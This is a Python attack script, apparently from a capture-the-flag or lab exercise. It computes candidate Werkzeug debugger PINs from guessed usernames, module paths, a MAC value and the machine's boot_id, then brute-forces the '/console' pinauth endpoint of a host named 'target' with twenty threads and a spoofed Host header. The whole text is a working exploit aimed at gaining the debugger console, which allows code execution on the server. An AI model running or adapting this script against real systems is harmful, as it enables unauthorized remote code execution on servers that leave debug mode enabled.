import hashlib
import requests
from itertools import chain
import concurrent.futures

boot_id = open('/proc/sys/kernel/random/boot_id').read().strip()
mac = "2485377892356" # hex 02:42:AC:1C:00:04

usernames = ['root', 'app', 'www-data', 'werkzeug', 'nobody']
modnames = ['flask.app', 'werkzeug.debug', 'app', '__main__']
appnames = ['Flask', 'DebuggedApplication', 'wsgi_app', 'app']
modfiles = [
    '/usr/local/lib/python3.11/site-packages/flask/app.py',
    '/usr/local/lib/python3.11/site-packages/werkzeug/debug/__init__.py',
    '/usr/lib/python3.11/site-packages/flask/app.py',
    '/usr/lib/python3.11/site-packages/werkzeug/debug/__init__.py',
    '/app/app.py',
    '/app/main.py',
    getattr(requests, '__file__', '')
]
machine_ids = [boot_id, ""]

pins = set()

for u in usernames:
    for m1 in modnames:
        for m2 in appnames:
            for m3 in modfiles:
                for mid in machine_ids:
                    for hash_type in ['sha1', 'md5']:
                        try:
                            h = getattr(hashlib, hash_type)()
                            for bit in chain([u, m1, m2, m3], [mac, mid]):
                                if not bit: continue
                                if isinstance(bit, str): bit = bit.encode('utf-8')
                                h.update(bit)
                            h.update(b'cookiesalt')
                            h.update(b'pinsalt')
                            num = f"{int(h.hexdigest(), 16):09d}"[:9]
                            pin = f"{num[:3]}-{num[3:6]}-{num[6:9]}"
                            pins.add(pin)
                        except: pass

print(f"Generated {len(pins)} PINs.")

s = requests.Session()
secret = "cROx4oCXXz5PA5qlhIU3"
url = "http://target:8127/console"

def try_pin(pin):
    # Werkzeug uses ?__debugger__=yes&cmd=pinauth&pin=...&s=...
    r = s.get(url, params={'__debugger__': 'yes', 'cmd': 'pinauth', 'pin': pin, 's': secret}, headers={'Host': 'localhost'})
    if '"auth"' in r.text and 'true' in r.text or r.status_code != 200:
        print(f"[*] PIN EXPLOITED: {pin}")
        return pin
    return None

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    for res in executor.map(try_pin, list(pins)):
        pass
EOF

